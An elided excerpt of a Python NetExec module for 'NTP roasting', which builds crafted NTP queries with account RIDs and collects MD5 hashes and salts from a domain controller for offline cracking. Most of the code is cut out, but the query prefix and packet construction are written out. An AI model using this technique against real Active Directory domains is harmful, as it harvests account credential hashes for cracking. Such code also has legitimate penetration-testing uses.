...
class NXCModule:
    ...
    def __init__(self):
        ...
        self.ntp_prefix = unhexlify(
            "db0011e9000000000001000000000000e1b8407debc7e50600000000000000000000000000000000e1b8428bffbfcd0a"
        )
    ...
    def on_login(self, context, connection):
        ...
        for rid, md5hash, salt in self.run_ntp_roast(
            context,
            self.target,
            self.rids,
            self.rate,
    ...
    def run_ntp_roast(
        self, context, dc_host, rids, rate, giveup_time, old_pwd, src_port=0
    ):
        ...
        with socket(AF_INET, SOCK_DGRAM) as sock:
            try:
                ...
                context.log.exception(
                    f"No permission to listen on port {src_port}. May need to run as root."
                )
            ...
            while time() < last_ok_time + giveup_time:
                ...
                if query_rid is not None:
                    query = (
                        self.ntp_prefix + pack("<I", query_rid ^ keyflag) + b"\x00" * 16
                    )
